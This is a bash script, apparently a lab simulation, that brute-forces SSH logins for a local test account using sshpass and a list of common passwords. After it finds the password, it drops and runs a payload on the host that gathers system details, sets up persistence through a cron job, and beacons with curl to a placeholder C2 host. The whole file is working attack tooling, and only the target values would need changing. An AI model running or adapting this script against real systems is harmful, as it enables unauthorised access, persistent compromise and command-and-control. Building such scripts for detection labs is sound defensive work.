
#!/bin/bash

# Phase 1: SSH Brute Force Attack
# Simulates automated password guessing against weakuser account

TARGET="127.0.0.1"
USER="weakuser"

# Extended password list (common passwords)
PASSWORDS=(
    "admin"
    "password"
    "123456"
    "password123"
    "12345678"
    "qwerty"
    "abc123"
    "monkey"
    "1234567"
    "letmein"
    "trustno1"
    "dragon"
    "baseball"
    "iloveyou"
    "master"
    "sunshine"
    "ashley"
    "bailey"
    "passw0rd"
    "shadow"
    "123123"
    "654321"
    "superman"
    "qazwsx"
    "michael"
    "Football"
    "welcome"
    "jesus"
    "ninja"
    "mustang"
    "s3CuriTy!\$neAt"  # The actual password - attempt 31
)

echo ""
echo "[*] ============================================"
echo "[*] Phase 1: SSH Brute Force Attack"
echo "[*] Target: $USER@$TARGET"
echo "[*] ============================================"
echo ""

for i in "${!PASSWORDS[@]}"; do
    PASSWORD="${PASSWORDS[$i]}"
    ATTEMPT=$((i + 1))
    
    echo "[*] Attempt $ATTEMPT: Trying password '$PASSWORD'..."
    
    sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 $USER@$TARGET "exit" 2>/dev/null
    
    if [ $? -eq 0 ]; then
        echo "[+] SUCCESS! Password found: '$PASSWORD'"
        echo ""
        
        # Deploy malicious payload
        echo "[*] Deploying malicious payload..."
        sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no $USER@$TARGET "cat > /tmp/malicious.sh << 'PAYLOAD'
#!/bin/bash
# Simulated post-compromise activity

# Reconnaissance
whoami > /tmp/recon.txt
id >> /tmp/recon.txt
uname -a >> /tmp/recon.txt
ip addr >> /tmp/recon.txt

# Persistence attempt
echo '*/5 * * * * /tmp/malicious.sh' | crontab -

# Simulated C2 beacon
curl -X POST http://attacker-c2.example.com/beacon -d 'host=victim-ubuntu&status=compromised' 2>/dev/null || true

echo 'Malicious activity complete'
PAYLOAD
"
        
        # Execute payload
        echo "[*] Executing payload..."
        sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no $USER@$TARGET "chmod +x /tmp/malicious.sh && /tmp/malicious.sh"
        
        echo "[+] Payload executing..."
        echo "[+] Attack complete!"
        exit 0
    else
        echo "[-] Failed"
    fi
    
    sleep 2
done

echo ""
echo "[-] Attack failed - no valid password found"
